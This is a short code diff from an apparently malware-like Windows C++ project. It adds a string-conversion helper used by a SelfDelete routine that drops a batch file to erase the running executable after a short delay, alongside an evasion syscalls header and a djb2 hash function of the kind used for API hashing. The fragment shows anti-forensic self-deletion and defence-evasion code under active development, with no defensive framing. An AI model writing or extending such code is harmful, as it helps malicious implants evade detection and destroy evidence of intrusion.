@@ -6,6 +6,13 @@
 #include "../evasion/Syscalls.h"
 
 namespace {
+std::string WideToMultiByte(const std::wstring& wstr) {
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
 // djb2 hash impl
 DWORD djb2Hash(const char* str) {
     DWORD hash = 5381;
@@ -50,8 +57,8 @@ void SelfDelete() {
 
     std::string batContent = "@echo off\r\n"
                              "ping 127.0.0.1 -n 3 > nul\r\n"
-                             "del /Q \"" + std::string(executablePath.begin(), executablePath.end()) + "\"\r\n"
-                             "del /Q \"" + std::string(batPath.begin(), batPath.end()) + "\"";
+                             "del /Q \"" + WideToMultiByte(executablePath) + "\"\r\n"
+                             "del /Q \"" + WideToMultiByte(batPath) + "\"";
 
     HANDLE hFile = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE) {
